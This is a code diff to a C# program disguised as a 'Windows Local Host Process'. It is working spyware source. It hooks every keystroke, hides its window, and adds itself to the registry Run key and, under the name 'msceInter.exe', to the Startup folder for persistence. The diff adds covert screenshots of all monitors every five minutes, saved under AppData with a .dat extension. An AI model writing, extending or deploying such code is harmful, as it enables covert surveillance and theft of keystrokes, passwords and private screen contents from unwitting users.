@@ -7,38 +7,65 @@ using System.Diagnostics;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Drawing;
 using Microsoft.Win32;
+using System.ComponentModel;
+using System.Data;
 
 namespace Windows_Local_Host_Process
 {
     class Program
     {
-         
-
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
-        //static string Date = DateTime.Today.ToString().Substring(0, 10).Replace("/", "");
-        static string Date = DateTime.Today.Year.ToString() + "-" + DateTime.Today.Month.ToString().PadLeft(2, '0') + "-" + DateTime.Today.Day.ToString().PadLeft(2, '0');
+        static string Date = DateTime.Now.Year.ToString() + "-" + DateTime.Now.Month.ToString().PadLeft(2, '0') + "-" + DateTime.Now.Day.ToString().PadLeft(2, '0');
 
         public static void Main(string[] args)
         {
-            
-            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("AutoRun", Application.ExecutablePath.ToString());
-                
-            AddToStartup();
+            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("AutoRun", Application.ExecutablePath.ToString());   
+            //AddToStartup();
             Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             key.SetValue("Windows Local Host Process", Application.StartupPath);
             var handle = GetConsoleWindow();
 
+
+            var task = Task.Run(async () => {
+                for (; ; )
+                {
+                    //take screenshot every 5 minutes
+                    await Task.Delay(300000);
+                    takeScreenshot();
+                }
+            });
+
             // Hide
             ShowWindow(handle, SW_HIDE);
-            //MessageBox.Show(Application.StartupPath + @"\" + Date + ".txt");
-
             _hookID = SetHook(_proc);
+            takeScreenshot();
             Application.Run();
             UnhookWindowsHookEx(_hookID);
+        }
+
+        public static void takeScreenshot()
+        {
+            String Time = DateTime.Now.Year.ToString() + "-" + DateTime.Now.Month.ToString().PadLeft(2, '0') + "-" + DateTime.Now.Day.ToString().PadLeft(2, '0') + "_" + DateTime.Now.Hour.ToString().PadLeft(2, '0') + "." + DateTime.Now.Minute.ToString().PadLeft(2, '0') + "." + DateTime.Now.Second.ToString().PadLeft(2, '0');
+            String path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\data\\" + Time;
+            int x = 0;
+            Bitmap bmp = null;
+            foreach (Screen screen in Screen.AllScreens)
+            {
+                //loop through each screen, take a screenshot of each
+                bmp = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);//create a new bitmap with the same size as the current screen
+                using (Graphics g = Graphics.FromImage(bmp))
+                {
+                    g.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, 0, 0, screen.Bounds.Size);//get stuff on screen
+                    bmp.Save(path + "_" + x.ToString() + ".dat");  //save image
+                    x++;
+                }
+                bmp = null;
+            }
         }
 
         public static void AddToStartup()
@@ -46,9 +73,8 @@ namespace Windows_Local_Host_Process
             //MessageBox.Show(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "msceInter.exe");
             try
             {
-                //System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "msceInter.exe");
+                System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "msceInter.exe");
             }
-                
             catch { }
         }
 
